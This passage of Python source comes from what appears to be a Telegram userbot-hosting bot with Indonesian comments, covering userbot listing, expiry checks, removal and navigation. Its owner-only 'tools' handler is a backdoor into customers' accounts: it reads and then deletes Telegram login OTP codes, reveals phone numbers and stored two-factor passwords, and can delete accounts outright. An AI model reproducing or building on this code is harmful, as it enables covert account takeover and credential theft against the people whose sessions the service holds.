                        return await msg.edit(f"❌ {error}")

# ============================================
# CEK UBOT & DELETE
# ============================================

@PY.CALLBACK("cek_ubot")
async def _(client, callback_query):
    await callback_query.answer()
    if not ubot._ubot:
        await callback_query.edit_message_text("Tidak ada userbot aktif.")
        return
    try:
        await bot.send_message(
            callback_query.from_user.id,
            await MSG.UBOT(0),
            reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0)),
        )
    except Exception as e:
        await callback_query.edit_message_text(f"Error: {e}\nStart bot di PM dulu!")

@PY.CALLBACK("cek_masa_aktif")
async def _(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"✅ Sisa {xxxx} hari!", True)
    except:
        return await callback_query.answer("❌ Sudah tidak aktif", True)
        
@PY.CALLBACK("del_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in await get_list_from_vars(client.me.id, "ADMIN_USERS"):
        return await callback_query.answer(f"❌ Bukan untukmu!", True)
    
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    
    for X in ubot._ubot:
        if get_id == X.me.id:
            # Unblock dengan handle flood
            try:
                await X.unblock_user(bot.me.username)
            except Flood:
                await asyncio.sleep(5)
                try:
                    await X.unblock_user(bot.me.username)
                except:
                    pass
            except Exception:
                pass
            
            await remove_ubot(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            
            # Logout (abaikan jika error)
            try:
                await X.log_out()
            except Exception:
                pass
            
            await callback_query.answer(f"✅ {get_mention} berhasil dihapus", True)
            
            # CEK APAKAH MASIH ADA USERBOT
            if len(ubot._ubot) > 0:
                # Masih ada userbot, tampilkan yang pertama
                await callback_query.edit_message_text(
                    await MSG.UBOT(0),
                    reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0)),
                )
            else:
                # Tidak ada userbot, tampilkan pesan kosong
                await callback_query.edit_message_text(
                    "<blockquote>📋 <b>DAFTAR USERBOT</b>\n━━━━━━━━━━━━━━━━━❍\n└  Kosong</blockquote>",
                    reply_markup=InlineKeyboardMarkup([]),
                )
            
            # Kirim pesan ke user (abaikan jika user sudah dihapus)
            try:
                await bot.send_message(
                    X.me.id,
                    MSG.EXP_MSG_UBOT(X),
                    reply_markup=InlineKeyboardMarkup(BTN.EXP_UBOT()),
                )
            except InputUserDeactivated:
                pass
            except Exception:
                pass
            
            break  # Keluar dari loop setelah menemukan dan menghapus

# ============================================
# NAVIGASI UBOT
# ============================================

@PY.CALLBACK("^(p_ub|n_ub)")
async def _(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    
    if query[0] == "n_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "p_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    
    await callback_query.edit_message_text(
        await MSG.UBOT(count),
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[count].me.id, count)),
    )

# ============================================
# TOOLS UBOT (OWNER)
# ============================================

@PY.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def tools_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    
    if user_id != OWNER_ID:
        return await callback_query.answer(f"❌ Bukan untukmu!", True)
    
    X = ubot._ubot[int(query[1])]
    
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ Kode OTP tidak ditemukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(str(error), True)
                
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<blockquote>📲 <b>NOMOR TELEGRAM</b>\n<code>{X.me.phone_number}</code></blockquote>",
                reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
            )
        except Exception as error:
            return await callback_query.answer(str(error), True)
            
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code is None:
            return await callback_query.answer("🔐 Two-factor tidak ditemukan", True)
        else:
            return await callback_query.edit_message_text(
                f"<blockquote>🔐 <b>TWO-FACTOR</b>\n<code>{code}</code></blockquote>",
                reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
            )
            
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.DEAK(X.me.id, int(query[1])))
        )
        
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="Deleted by owner"))
        return await callback_query.edit_message_text(
            MSG.DEAK(X),
            reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
        )